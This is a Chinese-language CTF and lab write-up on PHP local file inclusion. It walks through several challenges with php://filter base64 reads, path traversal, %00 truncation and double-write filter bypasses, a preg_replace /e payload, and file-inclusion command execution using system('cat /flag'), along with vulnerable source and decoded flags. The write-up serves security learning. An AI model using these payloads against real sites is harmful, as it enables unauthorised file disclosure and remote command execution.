mdl-grid&quot;&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;</span><br><span class="line">          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;h3&gt;Cheer up!&lt;/h3&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option <span class="keyword">and</span> let the adorable images cheer you up!</span><br><span class="line">              &lt;/p&gt;</span><br><span class="line">              &lt;div class=&quot;page-include&quot;&gt;</span><br><span class="line">              <span class="meta">&lt;?php</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">						<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="meta">?&gt;</span></span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">          &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;get&quot;</span> id=<span class="string">&quot;choice&quot;</span>&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">              &lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/material.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;			&lt;ýØ¯&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>猜测flag文件为flag为flag.php</p>
<p>由于存在过滤，在resouce前再套一层，实现绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;06c5fe33-f46d-4bc0-9393-c91435db174c.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7MDM2OGVhODktNWIwNC00YjQ3LTk3ZDEtMmM0MjM1Nzg0MmE4fQo&#x2F;Pgo&#x3D; </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> &#x2F;&#x2F; flag&#123;0368ea89-5b04-4b47-97d1-2c42357842a8&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<h1 id="Secret-File1"><a href="#Secret-File1" class="headerlink" title="Secret File1"></a>Secret File1</h1><p>来源：极客大挑战 2019</p>
<p>考察：php://filter伪协议</p>
<p>查看源码，提示访问这个链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Archive_room.php</span><br></pre></td></tr></table></figure>
<p>跳转后，继续查看源码，提示访问action.php，但会自动跳转到end.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;action.php</span><br><span class="line">&#x2F;end.php</span><br></pre></td></tr></table></figure>
<p>使用burp抓包，提示跳转到该地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php  </span><br></pre></td></tr></table></figure>
<p>访问后，显示源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>依照源码，提交file参数，在该参数进行文件包含</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NTk2OGNlNzEtYWVjNy00ZjllLTk1ZWYtMjk4ODZjM2NkM2VhfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æå°±å¨è¿é&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;5968ce71-aec7-4f9e-95ef-29886c3cd3ea&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;þfl&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>来源：ACTF2020 新生赛</p>
<p>考察：php://filter伪协议</p>
<p>进入网页后，一直往下点，看到链接为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>此处进行文件包含，得到base64编码的flag.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7N2JkNWJjODAtYzRiNS00MzAxLWE5OWItYWI1ZDUyNjg2OGQzfQo&#x3D;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;7bd5bc80-c4b5-4301-a99b-ab5d526868d3&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="不过如此"><a href="#不过如此" class="headerlink" title="不过如此"></a>不过如此</h1><p>来源：BJDCTF2020</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;63a6bf86-6f35-4685-9693-114742732cf8.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>源码发现，需要提交id和cmd，其中cmd可以被执行</p>
<p>此处考察preg_match的/e执行，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p>总之就是第一个参数为执行函数，第二个参数为输入参数。而\S*在正则中代表匹配的任意非空字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>
<h1 id="ezinclude（未完成）"><a href="#ezinclude（未完成）" class="headerlink" title="ezinclude（未完成）"></a>ezinclude（未完成）</h1><p>来源：NPUCTF 2020</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flflflflag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;404.html&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">	die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">@$name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">@$pass&#x3D;$_GET[&#39;pass&#39;];</span><br><span class="line">if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123;</span><br><span class="line">	echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;flflflflag.php&quot;;</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);</span><br><span class="line">	echo &quot;username&#x2F;password error&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">w%ude($_GET[&quot;~)^&quot;])</span><br></pre></td></tr></table></figure>
<p>说明要提交正确的name和pass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret&#x3D;&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">w%ude($_GET[&quot;~)^&quot;])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%^$&amp;$#fffdflag_is_not_here_ha_ha</span><br><span class="line">1</span><br><span class="line">%^$&amp;$#fffdflag_is_not_here_ha_ha</span><br></pre></td></tr></table></figure>
<p>之后需要用到PHP segfault上传shell，不知道是啥，再说吧</p>
<h1 id="LFI-labs"><a href="#LFI-labs" class="headerlink" title="LFI labs"></a>LFI labs</h1><p>在phpstudy的根目录www下有一个phpinfo.php，以访问到这个文件为目标</p>
<h2 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI-1"></a>LFI-1</h2><p>原php文件路径中，form action处路径有问题，输入参数后无法跳转到正确页面，修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;..&#x2F;LFI-1&#x2F;index.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>之后访问URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-1&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI-2"></a>LFI-2</h2><p>考察：%00截断</p>
<p>观察index.php，关键语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;includes&#x2F;&quot;.$_GET[&#39;library&#39;].&quot;.php&quot;); </span><br></pre></td></tr></table></figure>
<p>需要穿透includes目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
<p>学习wp，发现本题考的不是这个。要是其后添加的后缀不是.php，则这个解法不能通过</p>
<p>正确的姿势</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.php%00</span><br></pre></td></tr></table></figure>


<h3 id="error-reporting-E-ALL-amp-E-NOTICE-amp-E-WARNING"><a href="#error-reporting-E-ALL-amp-E-NOTICE-amp-E-WARNING" class="headerlink" title="error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);"></a>error_reporting(E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);</h3><p>报告除了E_NOTICE和E_WARNING之外的所有错误</p>
<h2 id="LFI-3"><a href="#LFI-3" class="headerlink" title="LFI-3"></a>LFI-3</h2><p>关键语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (substr($_GET[&#39;file&#39;], -4, 4) !&#x3D; &#39;.php&#39;)</span><br></pre></td></tr></table></figure>
<p>/.绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.</span><br><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-2&#x2F;index.php?library&#x3D;..&#x2F;..&#x2F;phpinfo.&#x2F;</span><br></pre></td></tr></table></figure>
<p>本题环境有问题，此处直接抄的wp</p>
<h2 id="LFI-4"><a href="#LFI-4" class="headerlink" title="LFI-4"></a>LFI-4</h2><p>考察：不加后缀绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;lfi&#x2F;LFI-4&#x2F;index.php?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo</span><br></pre></td></tr></table></figure>
<p><strong>错误的尝试</strong></p>
<p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.php%00</span><br></pre></td></tr></table></figure>
<p>被转码为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">includes&#x2F;class_&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.php\0.php </span><br></pre></td></tr></table></figure>
<p><strong>addslashes在ctf中等于无法绕过</strong></p>
<h2 id="LFI-5"><a href="#LFI-5" class="headerlink" title="LFI-5"></a>LFI-5</h2><p>考察：双写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="LFI-6"><a href="#LFI-6" class="headerlink" title="LFI-6"></a>LFI-6</h2><p>考察：post提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data: page&#x3D;..&#x2F;..&#x2F;phpinfo.php</span><br></pre></td></tr></table></figure>
<h2 id="LFI-7-14"><a href="#LFI-7-14" class="headerlink" title="LFI-7~14"></a>LFI-7~14</h2><p>基本相同，不再赘述</p>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-4174fe1e3951e1c9.sandbox.ctfhub.com:10080&#x2F;index.php?file&#x3D;shell.txt</span><br><span class="line">post data: ctfhub&#x3D;system(&#39;ls&#39;);</span><br><span class="line">post data: ctfhub&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p>
<p>四个函数</p>
<p>include(), include_once(), require(), require_once()</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%8Chttps://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">https://www.cnblogs.com/wjrblogs/p/12285202.html，https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 